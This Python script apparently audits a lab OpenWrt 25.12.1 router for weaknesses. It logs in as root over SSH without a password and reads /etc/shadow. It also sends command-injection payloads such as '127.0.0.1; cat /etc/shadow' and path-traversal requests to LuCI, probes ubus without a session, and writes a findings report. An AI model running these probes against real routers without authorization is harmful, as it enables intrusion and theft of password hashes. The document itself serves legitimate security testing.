#!/usr/bin/env python3
"""
openwrt_live_audit.py — Live OpenWrt 25.12.1 deep security audit
Author: Andre Henrique (@mrhenrike) | Uniao Geek

Tests: root no-password SSH, uhttpd auth bypass, LuCI injection,
DHCP hostname injection, ucode engine probing, package manager abuse.
"""
from __future__ import annotations

import io
import json
import os
import re
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REPO_ROOT = Path(__file__).resolve().parent.parent
REPORTS_DIR = REPO_ROOT / "reports" / "openwrt_25121_x86"
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
if sys.stderr.encoding and sys.stderr.encoding.lower() not in ("utf-8", "utf8"):
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

import argparse as _ap
_p = _ap.ArgumentParser(add_help=False)
_p.add_argument("--host", default="192.168.100.20")
_p.add_argument("--ssh-port", type=int, default=22)
_p.add_argument("--http-port", type=int, default=443)
_a, _ = _p.parse_known_args()
SSH_HOST = _a.host
SSH_PORT = _a.ssh_port
HTTP_HOST = _a.host
HTTP_PORT = _a.http_port
HTTP_SCHEME = "https" if HTTP_PORT == 443 else "http"

findings: list[dict] = []


def add_finding(fid, sev, title, detail, evidence=""):
    findings.append({"id": fid, "severity": sev, "title": title,
                     "detail": detail, "evidence": evidence[:2000]})
    tag = {"CRITICAL": "!!!", "HIGH": "!! ", "MEDIUM": "!  "}.get(sev, "   ")
    print(f"  [{tag}] {fid} ({sev}): {title}")


def ssh_exec(cmd, timeout=10):
    """Execute command via SSH (root, no password)."""
    try:
        r = subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=NUL",
             "-o", "BatchMode=yes",
             "-p", str(SSH_PORT),
             f"root@{SSH_HOST}", cmd],
            capture_output=True, text=True, timeout=timeout,
        )
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        return -99, "", "SSH client not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"


def http_get(path, **kwargs):
    try:
        r = requests.get(f"{HTTP_SCHEME}://{HTTP_HOST}:{HTTP_PORT}{path}",
                         timeout=10, verify=False, **kwargs)
        return r.status_code, r.text, r.headers
    except Exception as e:
        return -1, str(e), {}


def test_root_nopass():
    print("\n=== TEST 1: Root SSH without password ===\n")

    rc, out, err = ssh_exec("id")
    if rc == 0 and "root" in out:
        add_finding(
            "F-OW-SSH-ROOT-NOPASS", "CRITICAL",
            "Root SSH access with NO password",
            "OpenWrt allows root login via SSH/dropbear without any password. "
            "Full system compromise from any device on the network.",
            f"$ id\n{out}",
        )
        print(f"  ROOT ACCESS CONFIRMED: {out.strip()}")

        # Gather system info
        for cmd in [
            "cat /etc/openwrt_release",
            "uname -a",
            "cat /etc/shadow",
            "cat /etc/passwd",
            "ps w",
            "netstat -tlnp 2>/dev/null || ss -tlnp",
            "cat /etc/config/network",
            "cat /etc/config/wireless",
            "cat /etc/config/dhcp",
            "ls -la /usr/lib/libiwinfo*",
            "opkg list-installed 2>/dev/null || apk list --installed",
            "cat /etc/config/uhttpd",
        ]:
            rc2, out2, _ = ssh_exec(cmd)
            if rc2 == 0 and out2.strip():
                short = cmd.split("/")[-1] if "/" in cmd else cmd.split()[0]
                print(f"  {short}: {out2[:80].strip()}")
    else:
        print(f"  SSH failed: rc={rc}, err={err[:100]}")
        # Fallback: try without BatchMode
        print("  Trying SSH without BatchMode...")


def test_uhttpd_noauth():
    print("\n=== TEST 2: uhttpd / LuCI without authentication ===\n")

    # Test if LuCI is accessible without login
    paths = [
        "/",
        "/cgi-bin/luci",
        "/cgi-bin/luci/admin/status/overview",
        "/cgi-bin/luci/admin/network/network",
        "/cgi-bin/luci/admin/system/admin",
        "/cgi-bin/luci/admin/status/routes",
        "/cgi-bin/luci/admin/network/diagnostics",
    ]

    for path in paths:
        st, body, hdrs = http_get(path)
        has_login = "login" in body.lower() if isinstance(body, str) else False
        is_redirect = st in (301, 302, 303)
        if st == 200 and not has_login:
            add_finding(
                f"F-OW-LUCI-NOAUTH-{path.split('/')[-1].upper()}", "HIGH",
                f"LuCI page accessible without auth: {path}",
                f"HTTP 200 returned without login prompt. Content-Type: "
                f"{hdrs.get('content-type', '?')}",
                body[:500],
            )
        print(f"  {path}: HTTP {st} {'(login page)' if has_login else '(content)' if st==200 else ''}")

    # Try to get LuCI auth token (RPC)
    st, body, _ = http_get("/cgi-bin/luci/rpc/auth", )
    print(f"  RPC auth endpoint: HTTP {st}")


def test_luci_injection():
    print("\n=== TEST 3: LuCI CGI injection testing ===\n")

    # Test command injection via various LuCI endpoints
    injection_payloads = [
        # Diagnostic ping with injection
        ("/cgi-bin/luci/admin/network/diagnostics",
         {"post": True, "data": {"ping": "127.0.0.1; id", "proto": "4"}},
         "Ping command injection"),
        # Traceroute injection
        ("/cgi-bin/luci/admin/network/diagnostics",
         {"post": True, "data": {"traceroute": "127.0.0.1; cat /etc/shadow"}},
         "Traceroute command injection"),
    ]

    for path, opts, desc in injection_payloads:
        if opts.get("post"):
            try:
                r = requests.post(
                    f"{HTTP_SCHEME}://{HTTP_HOST}:{HTTP_PORT}{path}",
                    data=opts.get("data", {}), timeout=10, verify=False,
                )
                has_output = "root:" in r.text or "uid=0" in r.text
                print(f"  [{desc}] HTTP {r.status_code} {'!!! INJECTION' if has_output else ''}")
                if has_output:
                    add_finding(
                        "F-OW-LUCI-CMDINJECT", "CRITICAL",
                        f"Command injection via LuCI: {desc}",
                        "Injected payload executed. Output contains system data.",
                        r.text[:500],
                    )
            except Exception as e:
                print(f"  [{desc}] ERR: {e}")

    # Test path traversal in uhttpd
    traversal = [
        "/cgi-bin/luci/../../etc/passwd",
        "/../../../etc/shadow",
        "/cgi-bin/luci/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/luci/admin/../../../../../../etc/shadow",
    ]
    for path in traversal:
        st, body, _ = http_get(path)
        if st == 200 and ("root:" in body):
            add_finding(
                "F-OW-UHTTPD-TRAVERSAL", "CRITICAL",
                f"Path traversal in uhttpd: {path[:50]}",
                "uhttpd serves files outside web root.",
                body[:500],
            )
        print(f"  Traversal {path[:40]}: HTTP {st}")


def test_package_manager():
    print("\n=== TEST 4: Package manager abuse ===\n")

    # Check if opkg/apk allows unsigned packages
    rc, out, err = ssh_exec("apk info 2>/dev/null || opkg status 2>/dev/null | head -20")
    if rc == 0:
        print(f"  Package manager: {out[:80].strip()}")

    # Check signature verification settings
    rc, out, _ = ssh_exec("cat /etc/apk/repositories 2>/dev/null; cat /etc/opkg.conf 2>/dev/null")
    if rc == 0:
        print(f"  Repos config: {out[:200].strip()}")
        if "option check_signature" not in out and "verify" not in out.lower():
            add_finding(
                "F-OW-PKG-NOSIG", "HIGH",
                "Package manager signature verification not enforced",
                "No explicit signature check in package config. "
                "Allows installation of tampered packages.",
                out[:500],
            )


def test_dhcp_hostname_injection():
    print("\n=== TEST 5: DHCP hostname processing analysis ===\n")

    # Read the netifd proto scripts to check hostname handling
    scripts_to_check = [
        "/lib/netifd/proto/dhcp.sh",
        "/lib/netifd/netifd-proto.sh",
        "/usr/share/udhcpc/default.script",
        "/lib/netifd/dhcp.script",
    ]

    for script in scripts_to_check:
        rc, out, _ = ssh_exec(f"cat {script} 2>/dev/null")
        if rc == 0 and out.strip():
            print(f"  FOUND: {script} ({len(out)} bytes)")

            # Analyze for hostname handling
            if "hostname" in out.lower():
                lines = out.splitlines()
                for i, line in enumerate(lines):
                    if "hostname" in line.lower() and not line.strip().startswith("#"):
                        context = "\n".join(lines[max(0,i-2):i+3])
                        # Check if hostname is quoted/sanitized
                        has_quotes = '"$' in line or "'$" in line or "shellquote" in line
                        if not has_quotes and ("$" in line or "`" in line):
                            add_finding(
                                "F-OW-DHCP-HOSTNAME-UNSANITIZED", "HIGH",
                                f"Unquoted hostname variable in {script}",
                                f"Line {i+1}: hostname variable used without quoting. "
                                "Malicious DHCP server can inject shell commands.",
                                context,
                            )
                            print(f"    !!! Unquoted hostname at line {i+1}: {line.strip()[:60]}")
                        else:
                            print(f"    hostname at line {i+1}: {line.strip()[:60]}")
        else:
            print(f"  NOT FOUND: {script}")

    # Also check ucode files for netifd
    rc, out, _ = ssh_exec("find /usr/share/ucode/netifd/ -name '*.uc' 2>/dev/null; find /usr/libexec/netifd/ -type f 2>/dev/null")
    if rc == 0 and out.strip():
        print(f"  ucode/netifd files: {out.strip()}")
        for f in out.strip().splitlines():
            rc2, content, _ = ssh_exec(f"cat {f}")
            if "hostname" in content.lower():
                print(f"    !!! hostname reference in {f}")
                # Extract relevant lines
                for i, line in enumerate(content.splitlines()):
                    if "hostname" in line.lower():
                        add_finding(
                            "F-OW-UCODE-HOSTNAME", "MEDIUM",
                            f"Hostname processing in ucode: {f}",
                            f"Line {i+1}: {line.strip()[:80]}",
                            line.strip(),
                        )


def test_libiwinfo():
    print("\n=== TEST 6: libiwinfo analysis ===\n")

    rc, out, _ = ssh_exec("ls -la /usr/lib/libiwinfo* 2>/dev/null")
    if rc == 0:
        print(f"  {out.strip()}")

    # Check version via strings
    rc, out, _ = ssh_exec("strings /usr/lib/libiwinfo.so 2>/dev/null | head -30")
    if rc == 0:
        print(f"  Strings: {out[:200].strip()}")

    # Check iwinfo binary capabilities
    rc, out, _ = ssh_exec("iwinfo 2>&1 | head -10")
    if rc == 0:
        print(f"  iwinfo: {out[:200].strip()}")

    # Check for wireless interfaces
    rc, out, _ = ssh_exec("iwinfo wlan0 info 2>&1; iwinfo phy0 info 2>&1")
    print(f"  Wireless: {out[:100].strip() if out else 'No wireless interfaces'}")


def test_ubus_exposure():
    print("\n=== TEST 7: ubus RPC exposure ===\n")

    # Check what ubus services are available
    rc, out, _ = ssh_exec("ubus list 2>/dev/null")
    if rc == 0:
        services = out.strip().splitlines()
        print(f"  ubus services: {len(services)}")
        for svc in services[:30]:
            print(f"    {svc}")

        # Check sensitive ubus calls
        sensitive = ["system", "file", "uci", "network", "network.interface", "session"]
        for s in sensitive:
            if s in services:
                rc2, out2, _ = ssh_exec(f"ubus -v list {s} 2>/dev/null | head -20")
                if "read" in out2 or "exec" in out2 or "write" in out2:
                    add_finding(
                        f"F-OW-UBUS-{s.upper().replace('.','_')}", "MEDIUM",
                        f"ubus service '{s}' exposes read/write/exec methods",
                        f"Methods: {out2[:200]}",
                        out2[:500],
                    )

    # Test ubus over HTTP (JSON-RPC)
    try:
        r = requests.post(
            f"{HTTP_SCHEME}://{HTTP_HOST}:{HTTP_PORT}/ubus",
            json={"jsonrpc": "2.0", "id": 1, "method": "call",
                  "params": ["00000000000000000000000000000000", "system", "info", {}]},
            timeout=5,
        )
        print(f"  ubus HTTP: {r.status_code} {r.text[:100]}")
        if r.status_code == 200:
            data = r.json()
            if data.get("result") and len(data["result"]) > 1 and data["result"][0] == 0:
                add_finding(
                    "F-OW-UBUS-HTTP-NOAUTH", "CRITICAL",
                    "ubus accessible via HTTP without valid session",
                    "ubus JSON-RPC returns data with null session token.",
                    r.text[:500],
                )
    except Exception as e:
        print(f"  ubus HTTP: {e}")


def generate_report():
    report_path = REPORTS_DIR / "live_audit_report.md"
    ts = datetime.now(timezone.utc).isoformat()[:19] + " UTC"

    lines = [
        "# OpenWrt 25.12.1 x86-64 -- Live Security Audit Report",
        f"> Generated: {ts}",
        "> Analyst: Andre Henrique (@mrhenrike) | Uniao Geek",
        f"> Target: {SSH_HOST}:{SSH_PORT} (SSH) / {HTTP_HOST}:{HTTP_PORT} (HTTP)",
        "> Method: SSH root shell + HTTP/LuCI active probing + ubus RPC",
        "",
        "---",
        "",
        "## Findings Summary",
        "",
    ]

    sev_counts = {}
    for f in findings:
        sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1

    lines += [
        "| Severity | Count |",
        "|----------|-------|",
    ]
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev in sev_counts:
            lines.append(f"| {sev} | {sev_counts[sev]} |")
    lines += [f"| **TOTAL** | **{len(findings)}** |", ""]

    for f in sorted(findings, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x["severity"], 9)):
        lines += [
            f"### {f['id']} -- {f['severity']}",
            "",
            f"**{f['title']}**",
            "",
            f"{f['detail']}",
            "",
        ]
        if f.get("evidence"):
            lines += ["```", f["evidence"][:800], "```", ""]

    lines += [
        "---",
        "*Live Audit Engine | Embedded Firmware Research Lab*",
        "*Andre Henrique (@mrhenrike) | Uniao Geek*",
    ]

    report_path.write_text("\n".join(lines), encoding="utf-8")
    print(f"\n  [OK] Report: {report_path}")

    raw = REPORTS_DIR / "live_audit_raw.json"
    raw.write_text(json.dumps(findings, indent=2, default=str), encoding="utf-8")
    print(f"  [OK] Raw: {raw}")


if __name__ == "__main__":
    print(f"\n{'='*70}")
    print("  OPENWRT 25.12.1 LIVE SECURITY AUDIT")
    print(f"  SSH: {SSH_HOST}:{SSH_PORT} | HTTP: {HTTP_HOST}:{HTTP_PORT}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print(f"{'='*70}")

    test_root_nopass()
    test_uhttpd_noauth()
    test_luci_injection()
    test_package_manager()
    test_dhcp_hostname_injection()
    test_libiwinfo()
    test_ubus_exposure()

    generate_report()

    print(f"\n{'='*70}")
    print(f"  AUDIT COMPLETE: {len(findings)} findings")
    for f in findings:
        print(f"    [{f['severity']:8s}] {f['id']}: {f['title'][:60]}")
    print(f"{'='*70}")
